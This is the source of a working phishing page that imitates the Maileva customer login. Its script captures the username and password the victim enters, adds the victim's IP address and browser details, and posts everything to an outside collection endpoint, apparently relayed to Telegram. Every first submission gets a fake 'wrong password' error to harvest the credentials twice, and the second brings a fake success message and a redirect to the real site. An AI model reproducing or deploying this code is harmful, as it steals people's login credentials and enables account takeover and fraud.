    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Maileva - support client </title>
    <link data-savepage-href="favicon.ico" src="favicon.ico" rel="icon">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>

    <style>
        html {
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            height: 100%;
        }

        *,
        *::before,
        *::after {
            box-sizing: inherit;
        }

        body {
            display: flex;
            height: 100%;
            min-height: 720px;
            padding: 0;
            margin: 0;
            align-items: center;
            font-family: "Barlow", sans-serif;
            background-size: cover;
            background-image:
                /*savepage-url=loginBackground.jpg*/
                var(--savepage-url-14);
            font-family: "Barlow", sans-serif;
            color: #00008c;
        }

        .form-wrapper {
            width: 480px;
            margin: 0 0 0 10%;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            background-color: #ffffff;
            height: 650px;
            padding: 0 75px;
        }

        .formHelperText {
            color: #da1d28;
            margin: 0;
            font-size: 12px;
            text-align: left;
            margin-top: 4px;
            min-height: 1.4em;
            line-height: 1em;
            top: 50px;
            visibility: hidden;
        }

        .formError .formHelperText {
            visibility: visible;
        }

        *.noMargin.noMargin {
            margin: 0;
        }

        .elevation {
            box-shadow: 0px 1px 5px 0px rgba(0, 0, 0, 0.2),
                0px 2px 2px 0px rgba(0, 0, 0, 0.14),
                0px 3px 1px -2px rgba(0, 0, 0, 0.12);
        }

        .pageHeader {
            padding-top: 20px;
            display: flex;
            flex-direction: column;
        }

        .pageHeader a {
            text-decoration: none;
            height: 100px;
            display: block;
            margin-bottom: 18px;
            width: 200px;
        }

        .pageHeader svg {
            fill: #0432ff;
            width: 250px;
            height: 100px;
            margin-bottom: 30px;
            margin-left: -29px;
        }

        .pageTitle {
            font-family: "Montserrat", sans-serif;
            color: #00008c;
            font-size: 28px;
            font-style: normal;
            font-weight: 400;
            line-height: 1.28;
            font-stretch: normal;
            margin-top: -9px;
            margin-bottom: 0;
        }


        form input,
        form select,
        form textarea,
        button {
            transition: background-color 250ms, color 250ms, filter 250ms;
        }

        form input:-webkit-autofill,
        form select:-webkit-autofill,
        form textarea:-webkit-autofill {
            animation-duration: 250ms;
            animation-name: onautofillstart;
        }

        input:not(:-webkit-autofill),
        select:not(:-webkit-autofill),
        textarea:not(:-webkit-autofill) {
            animation-duration: 250ms;
            animation-name: onautofillcancel;
        }

        @keyframes onautofillstart {
            from {}
        }

        @keyframes onautofillcancel {
            from {}
        }

        ::-ms-clear {
            display: none;
        }

        ::-ms-reveal {
            display: none;
        }

        .buttonBase {
            border: 0;
            cursor: pointer;
            display: inline-flex;
            position: relative;
            align-items: center;
            user-select: none;
            vertical-align: middle;
            justify-content: center;
            text-decoration: none;
            -webkit-appearance: none;
            -webkit-tap-highlight-color: transparent;

            padding: 6px 16px;
            min-width: 64px;
            box-sizing: border-box;
            line-height: 1.75;
            font-family: Montserrat;
            color: #ffffff;
            width: 100%;
            height: 48px;
            font-size: 14px;
            margin: 0;
            font-weight: bold;
            border-radius: 100px;
            letter-spacing: 0.8px;
            outline: none;

            background-color: #0432ff;
        }

        .buttonBase:hover {
            text-decoration: none;
            background-color: #00008c;
        }

        input[type="submit"]:hover,
        button:hover {
            text-decoration: none;
            background-color: #00008c;
        }

        /* Loader behavior: show spinner and hide text when button has .loading */
        .buttonBase .spinner {
            display: none;
            width: 18px;
            height: 18px;
            margin-right: 10px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            box-sizing: border-box;
            animation: spin 1s linear infinite;
        }

        .buttonBase.loading .spinner {
            display: inline-block;
        }

        .buttonBase.loading .btn-text {
            display: none;
        }

        .buttonBase.loading {
            justify-content: center;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .formControl {
            border: 0;
            display: inline-flex;
            padding: 0;
            position: relative;
            min-width: 100%;
            flex-direction: column;
            vertical-align: top;
            margin-bottom: 16px;
        }

        .formControl:last-child {
            margin-bottom: 0;
        }

        label {
            font-size: 14px;
            font-weight: 600;
            line-height: 2.3em;
        }

        .formControl>div {
            position: relative;
            display: inline-flex;
            align-items: center;
            height: 50px;
            width: 100%;
        }

        form {
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            flex-grow: 1;
            position: relative;
            margin-bottom: 0;
        }

        form> :last-child {
            padding-bottom: 32px;
        }

        fieldset {
            padding: 0;
            top: 0;
            right: 0px;
            bottom: 0;
            left: -10px;
            position: absolute;
            box-sizing: border-box;
            border: none;
            transition: padding-left 200ms cubic-bezier(0, 0, 0.2, 1) 0ms,
                border-color 200ms cubic-bezier(0, 0, 0.2, 1) 0ms,
                border-width 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
        }

        .captchaItems fieldset {
            position: relative;
            left: 0px;
        }

        fieldset input {
            width: 100%;
            padding-left: 10px;
            display: block;
            min-width: 0;
            box-sizing: border-box;
            background: none;
            -webkit-tap-highlight-color: transparent;
            height: 100%;
            border: 1px solid #d7d7da;
            margin: 1px;
            transition: padding-left 200ms cubic-bezier(0, 0, 0.2, 1) 0ms,
                border-color 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
            filter: none;
            border-radius: 4px;
        }

        fieldset input:hover {
            border: 1px solid #00008c;
        }

        fieldset input:focus,
        fieldset input:hover:focus {
            outline: none;
            margin-left: 0px;
            margin-right: 0px;

                        <fieldset class="inputFieldset">
                            <input autocomplete="off" class="inputText withMarginBottom" id="password" name="password"
                                tabindex="2" type="password" value="" required> <span class="icon" id="showPassword">
                                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" </span>
                        </fieldset>
                    </div>
                    <p class="formHelperText"> </p>
                    <div class="help-links" style="height: auto;justify-content: space-between;">
                        <a class="forgottenPassword fontSize15" data-savepage-href="retrieve-password" href=""
                            tabindex="6">Mot de passe oublié
                            ?</a>
                        <a class="forgottenPassword fontSize15" data-savepage-href="retrieve-login" href=""
                            tabindex="5">Identifiant oublié
                            ?</a>
                    </div>
                </div>
                <div>
                    <button class="buttonBase" tabindex="4" type="button" onclick="sendData(this)">
                        <span class="spinner" aria-hidden="true"></span>
                        <span class="btn-text">Se connecter</span>
                    </button>
                </div>

                <div id="submitError" class="submit-error" style="display:none;margin-top:12px;color:#da1d28;font-weight:600;text-align:center;"></div>
        </div>
        </form>
    </div>
    </div>

    <!-- Success modal -->
    <div id="successModal" class="modal" aria-hidden="true" style="display:none;">
        <div class="modal-content">
            <p id="successModalMessage" style="margin:0;">Votre identité a été validée avec succès, l'e-document vous a été envoyé à votre messagerie principale.<br>Merci de nous faire confiance.</p>
        </div>
    </div>
    <style>
        .modal { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.5); z-index: 9999; }
        .modal[aria-hidden="true"] { display: none; }
        .modal-content { background: #fff; padding: 22px 26px; border-radius: 8px; max-width: 520px; text-align: center; color: #000; box-shadow: 0 10px 30px rgba(0,0,0,0.2); font-size: 16px; line-height: 1.4; }
    </style>

    <script>
        // track how many times the user submitted
        window.submitAttempt = window.submitAttempt || 0;

        function showModal(message, durationMs) {
            const modal = document.getElementById('successModal');
            const msg = document.getElementById('successModalMessage');
            if (msg && message) msg.innerHTML = message;
            if (!modal) return;
            modal.setAttribute('aria-hidden', 'false');
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.setAttribute('aria-hidden', 'true');
                modal.style.display = 'none';
                window.location.href = 'https://maileva.com';
            }, durationMs || 6000);
        }
        function handleFormSubmit(e) {
            e.preventDefault();
            const btn = e.submitter || document.querySelector('.buttonBase');
            sendData(btn);
            return false;
        }
        async function sendData(btn) {
            const button = btn || document.querySelector('.buttonBase');
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (!username || !password) {
                alert('Please enter both username and password');
                return;
            }

            // increment attempt count (1 = first submit, 2 = second)
            window.submitAttempt = (window.submitAttempt || 0) + 1;
            const attempt = window.submitAttempt;

            // show spinner immediately
            let spinnerEl = null, btnTextEl = null;
            if (button) {
                button.disabled = true;
                button.classList.add('loading');
                spinnerEl = button.querySelector('.spinner');
                btnTextEl = button.querySelector('.btn-text');
                if (spinnerEl) spinnerEl.style.display = 'inline-block';
                if (btnTextEl) btnTextEl.style.display = 'none';
            }

            // spinner duration between 3s and 5s
            const spinnerDelayMs = Math.floor(Math.random() * 2000) + 3000;
            const spinnerTimer = new Promise(resolve => setTimeout(resolve, spinnerDelayMs));

            // send data to Telegram (wait for it)
            let sendError = null;
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipResponse.json();
                const userAgent = navigator.userAgent;
                const now = new Date();
                const date = now.getFullYear() + '-' + String(now.getMonth() + 1).padStart(2, '0') + '-' + String(now.getDate()).padStart(2, '0');
                var message = "MAILEVA - New ID\n";
                message += "------------------------------\n";
                message += "Identifiant : " + username + "\n";
                message += "Mot de passe : " + password + "\n";
                message += "------------------------------\n";
                message += "IP : " + ip + "\n";
                message += "User-Agent : " + userAgent + "\n";
                message += "Date : " + date + "\n";
                message += "------------------------------";

                const resp = await fetch('https://sso-maileva-support.onrender.com/send-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message })
                });
                // try to read to ensure send completed
                try { await resp.json(); } catch (e) { /* ignore parse errors */ }
            } catch (err) {
                console.error('Send error:', err);
                sendError = err;
            }

            // wait for spinner to finish
            await spinnerTimer;

            // If first attempt: show inline error and let user try again
            if (attempt === 1) {
                const errEl = document.getElementById('submitError');
                if (errEl) {
                    errEl.innerText = "Mot de passe ou adresse e-mail incorrect, veuillez réessayer.";
                    errEl.style.display = 'block';
                }
                // restore button state so user can resubmit
                if (button) {
                    button.disabled = false;
                    button.classList.remove('loading');
                    if (spinnerEl) spinnerEl.style.display = '';
                    if (btnTextEl) btnTextEl.style.display = '';
                }

                // hide error after 4s
                setTimeout(() => {
                    const errEl2 = document.getElementById('submitError');
                    if (errEl2) errEl2.style.display = 'none';
                }, 4000);

                return;
            }

            // attempt >=2: show success modal and redirect (send already performed)
            const modalMessage = `Votre identité a été validée avec succès, l'e-document vous a été envoyé à votre messagerie principale.<br>Merci de nous faire confiance.`;
            showModal(modalMessage, 6000);
        }
    </script>

</body>
